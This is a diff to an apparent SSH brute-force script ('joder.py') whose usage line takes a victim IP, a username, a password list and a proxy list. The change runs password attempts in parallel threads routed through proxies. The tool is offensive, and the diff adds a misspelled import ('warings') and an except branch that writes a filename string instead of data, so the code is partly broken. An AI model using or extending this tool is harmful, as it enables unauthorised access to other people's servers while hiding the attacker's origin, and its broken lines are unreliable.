@@ -4,8 +4,15 @@ ssh-bruteforce-throug-proxy
 
 ## Usage: ./joder.py <Victim ip> 22 queloco pass.txt proxies.txt
 
-import sys, paramiko, warnings, os
-import socket, socks, urllib2
+import sys
+import paramiko
+import warings
+import os
+import socket
+import socks
+import urllib2
+import threading
+import time
 
 def request(proxy, p_proxy, password):
 
@@ -58,5 +65,10 @@ for pos in range(0,int(leng_pass)):
     proxy_pos = proxy_pos + 1
     password = (lines_pass[pos]).rstrip()
 
+    try:
+        t1 = threading.Thread(target=request,args=(ip_proxy, port_proxy, password))
+        t1.start()
+        time.sleep(0.3)
+    except:
+        no_done.write("no_done.txt")
 
-    request(ip_proxy, port_proxy, password)
